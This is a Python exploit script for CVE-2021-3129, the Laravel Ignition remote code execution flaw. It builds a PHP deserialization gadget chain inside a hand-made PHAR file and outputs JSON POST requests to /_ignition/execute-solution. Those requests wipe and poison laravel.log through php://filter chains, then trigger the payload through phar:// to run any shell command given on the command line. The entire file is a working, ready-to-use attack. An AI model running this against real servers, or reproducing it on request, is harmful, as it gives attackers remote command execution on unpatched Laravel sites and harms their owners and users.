#!/usr/bin/env python3
"""Emit the full CVE-2021-3129 requests array for a given command.
Pure Python — no phpggc / PHP runtime required.
Gadget chain: Laravel/RCE9
  PendingBroadcast(events=Dispatcher(queueResolver="system"),
                   event=BroadcastEvent(connection=<cmd>))
"""
import sys, json, base64, struct, zlib, hashlib
import urllib.parse

LOG    = "/var/www/storage/logs/laravel.log"
CLEAR  = (f"php://filter/write=convert.base64-decode"
          f"|convert.base64-decode"
          f"|convert.base64-decode/resource={LOG}")
POISON = (f"php://filter/write=convert.iconv.utf-8.utf-16be"
          f"|convert.quoted-printable-encode"
          f"|convert.iconv.utf-16be.utf-8"
          f"|convert.base64-decode/resource={LOG}")
TRIGGER = f"phar://{LOG}/test.txt"


def php_serialize(cmd: str) -> bytes:
    """PHP-serialized Laravel/RCE9 chain, hand-encoded (no PHP runtime)."""
    # Class names and property names as they appear in PHP serialization.
    pb  = b'Illuminate\\Broadcasting\\PendingBroadcast'
    dsp = b'Illuminate\\Bus\\Dispatcher'
    ev  = b'Illuminate\\Broadcasting\\BroadcastEvent'

    def s(b: bytes) -> bytes:
        return b's:%d:"%s";' % (len(b), b)

    # Protected properties are prefixed with \0*\0; public are bare.
    # PendingBroadcast: 2 props (events, event)
    pb_body  = b''
    pb_body += s(b'\x00*\x00events') + b'O:%d:"%s":5:{' % (len(dsp), dsp)
    pb_body += s(b'\x00*\x00container') + b'N;'
    pb_body += s(b'\x00*\x00pipeline')  + b'N;'
    pb_body += s(b'\x00*\x00pipes')     + b'a:0:{}'
    pb_body += s(b'\x00*\x00handlers')  + b'a:0:{}'
    pb_body += s(b'\x00*\x00queueResolver') + s(b'system')
    pb_body += b'}'
    pb_body += s(b'\x00*\x00event') + b'O:%d:"%s":1:{' % (len(ev), ev)
    # BroadcastEvent::$connection is PUBLIC in Laravel 8.x
    pb_body += s(b'connection') + s(cmd.encode())
    pb_body += b'}'
    return b'O:%d:"%s":2:{%s}' % (len(pb), pb, pb_body)


def build_phar(cmd: str) -> bytes:
    """Minimal valid PHAR containing one file 'test.txt' whose manifest
    metadata is the gadget chain. Signature = SHA256."""
    meta    = php_serialize(cmd)
    stub    = b'<?php __HALT_COMPILER(); ?>\r\n'
    fname   = b'test.txt'
    fdata   = b'test'                          # arbitrary; never read
    api_ver = 0x1110
    gflags  = 0x00010000                       # signature, no compression

    # Manifest body (without the 4-byte manifest_len header)
    body  = struct.pack('<I', 1)               # num_files
    body += struct.pack('<H', api_ver)
    body += struct.pack('<I', gflags)
    body += struct.pack('<I', len(fname)) + fname
    body += struct.pack('<I', len(meta))  + meta
    # file entry
    body += struct.pack('<I', len(fname)) + fname
    body += struct.pack('<I', len(fdata))      # uncompressed size
    body += struct.pack('<I', 0)               # timestamp
    body += struct.pack('<I', len(fdata))      # compressed size
    body += struct.pack('<I', zlib.crc32(fdata) & 0xFFFFFFFF)
    body += struct.pack('<I', 0)               # flags
    body += struct.pack('<I', 0)               # per-file metadata length

    manifest_len = len(body) + 4               # includes 4-byte length field

    phar  = stub
    phar += struct.pack('<I', manifest_len)
    phar += body
    phar += fdata

    # Signature: SHA256 (type 3) + digest + "GBMB"
    phar += struct.pack('<I', 3)
    phar += hashlib.sha256(phar).digest()
    phar += b'GBMB'
    return phar


def req(var: str, vf: str) -> dict:
    return {
        "method": "POST",
        "path": "/_ignition/execute-solution",
        "headers": {"Content-Type": "application/json"},
        "body": json.dumps({
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {"variableName": var, "viewFile": vf},
        }),
    }


def main() -> None:
    cmd = " ".join(sys.argv[1:]) or "id"
    b64 = base64.b64encode(build_phar(cmd)).decode("ascii")

    out = [req("x", CLEAR)]
    for ch in b64:
        # base64 alphabet is all URL-safe printable ASCII — encode is a no-op
        # but explicit so the contract is visible.
        out.append(req(urllib.parse.quote(ch, safe=""), POISON))
    out.append(req("x", TRIGGER))

    # No trailing newline: the raw (non-escaped) splice in shell.rs trims
    # whitespace, but be explicit.
    sys.stdout.write(json.dumps(out))


if __name__ == "__main__":
    main()
